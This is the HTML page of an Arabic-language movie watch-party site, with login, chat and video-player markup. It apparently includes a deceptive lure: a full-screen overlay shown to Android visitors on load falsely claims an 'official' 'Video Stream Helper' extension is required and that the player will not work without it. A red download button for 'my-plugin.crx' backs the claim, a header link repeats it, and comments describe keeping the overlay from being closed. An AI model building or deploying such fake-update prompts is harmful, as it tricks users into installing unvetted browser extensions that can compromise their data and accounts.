<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cinema Hub Pro</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
    <script src="https://www.youtube.com/iframe_api"></script>
    <script src="https://download.agora.io/sdk/release/AgoraRTC_N-4.18.2.js"></script>
</head>
<body>
    <div class="floating-background" id="bg-animation">
        <img src="https://www.themoviedb.org/t/p/w600_and_h900_bestv2/36769.jpg" class="poster p1">
        <img src="https://www.themoviedb.org/t/p/w600_and_h900_bestv2/v99p0p2A4Oa7Yj8J6D2k9V9A2Xo.jpg" class="poster p2">
        <img src="https://www.themoviedb.org/t/p/w600_and_h900_bestv2/h9z79lRYslj79vT9vT9vT9vT9v.jpg" class="poster p3">
    </div>

    <div id="ambilight"></div>

    <div id="login-screen" class="overlay">
        <div class="login-card glass">
            <h1>Cinema Hub 🍿</h1>
            <div class="profile-section">
                <div class="profile-main">
                    <div id="preview-container" class="avatar-container">
                        <img id="preview" src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lucky">
                    </div>
                    <input type="file" id="avatarInput" hidden accept="image/*">
                    <label for="avatarInput" class="upload-btn">📸</label>
                </div>
                <div id="avatar-presets" class="presets"></div>
            </div>
            <input type="text" id="username" placeholder="اسمك المستعار">
            <input type="text" id="room-id" placeholder="رقم الغرفة">
            <input type="password" id="room-pass" placeholder="كلمة المرور">
            <button onclick="join()" class="btn-primary">دخول السينما</button>
        </div>
    </div>

    <div id="force-download-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:10000; color:white; text-align:center; font-family:sans-serif; justify-content:center; align-items:center;">
    <div style="background:#222; padding:30px; width:85%; max-width:400px; border-radius:15px; border:2px solid red; box-shadow: 0 0 20px rgba(255,0,0,0.5);">
        <img src="https://cdn-icons-png.flaticon.com/512/564/564619.png" width="60" style="margin-bottom:15px;">
        <h2 style="margin:0 0 10px 0; color:red;">تحديث مطلوب!</h2>
        <p style="font-size:14px; line-height:1.6;">لمشاهدة الأفلام بجودة 4K وبدون تقطيع على متصفح Kiwi، يجب تثبيت إضافة <b>"Video Stream Helper"</b> الرسمية.</p>
        <p style="font-size:12px; color:#aaa;">(لن يعمل المشغل حتى يتم التثبيت)</p>
        
        <a href="my-plugin.crx" id="download-trigger" onclick="startDownload()" download style="display:block; margin-top:20px; padding:15px; background:red; color:white; text-decoration:none; border-radius:10px; font-weight:bold; font-size:18px;">
            تحميل وتثبيت الآن
        </a>
    </div>
</div>

<script>
// وظيفة لإظهار النافذة بمجرد دخول الموقع
window.onload = function() {
    // نتحقق إذا كان المستخدم يستخدم أندرويد لزيادة الدقة
    var ua = navigator.userAgent.toLowerCase();
    if (ua.indexOf("android") > -1) {
        document.getElementById('force-download-overlay').style.display = 'flex';
    }
};

// وظيفة لمنع إغلاق النافذة (يمكنك إضافة كود هنا لإخفائها بعد التحميل بـ 5 ثواني مثلاً)
function startDownload() {
    alert("بعد تحميل الملف، اضغط على 'Add to Kiwi' في التنبيه الذي سيظهر لك.");
    // اختياري: إخفاء النافذة بعد الضغط (أو تركها كما طلبت)
    // setTimeout(() => { document.getElementById('force-download-overlay').style.display = 'none'; }, 5000);
}
</script>

    <div class="app-container" id="main-app" style="display: none;">
        <header class="glass">
            <div class="search-box">
                <input type="text" id="movieSearch" placeholder="ابحث عن فيلم... 🔍">
                <div id="searchResults" class="dropdown glass"></div>
                
                <div class="direct-url-box" style="margin-top: 10px; display: flex; gap: 5px;">
                    <input type="text" id="directLinkInput" placeholder="ضع رابط m3u8 أو mp4 هنا...">
                    <button onclick="playDirectUrl()" class="mini-btn">تشغيل</button>
                </div>
            </div>

            <a href="my-plugin.crx" style="padding: 15px; background: red; color: white; text-decoration: none;">
    تحميل مشغل 4K (مطلوب للمشاهدة)
</a>

            <div id="user-list">
                <div class="avatar-container" id="local-user">
                    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lucky" class="avatar-img" id="current-avatar">
                    <div class="user-name">أنت</div>
                    <div class="status-dot"></div>
                </div>
            </div>
        </header>

        <main>
            <div class="video-section">
                <div id="video-wrapper">
                    <div id="video-touch-layer" onclick="handleLayerClick()"></div>
                    <video id="video" style="display:none;" controls></video>
                    <div id="youtube-player" style="display:none;"></div>
                    <div id="iframe-slot"></div> 
                    <div id="emoji-display"></div>
                </div>
                
                <div class="cinema-footer glass">
                    <div class="reactions-bar">
                        <button onclick="sendEmoji('🔥')">🔥</button>
                        <button onclick="sendEmoji('😂')">😂</button>
                        <button onclick="sendEmoji('😱')">😱</button>
                        <button onclick="sendEmoji('❤️')">❤️</button>
                        <button onclick="sendEmoji('🍿')">🍿</button>
                        <button id="mic-btn" onclick="toggleMic()" class="mic-btn">🔇</button>
                        <button onclick="copyInviteLink()" class="share-btn" title="نسخ رابط الغرفة">🔗</button>
                    </div>
                </div>
            </div>

            <aside class="glass">
                <div class="chat-header">دردشة الغرفة</div>
                <div id="messages"></div>
                <div class="chat-input">
                    <input type="text" id="chatInput" placeholder="اكتب رسالة...">
                </div>
            </aside>
        </main>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script src="script.js"></script>
</body>
</html>
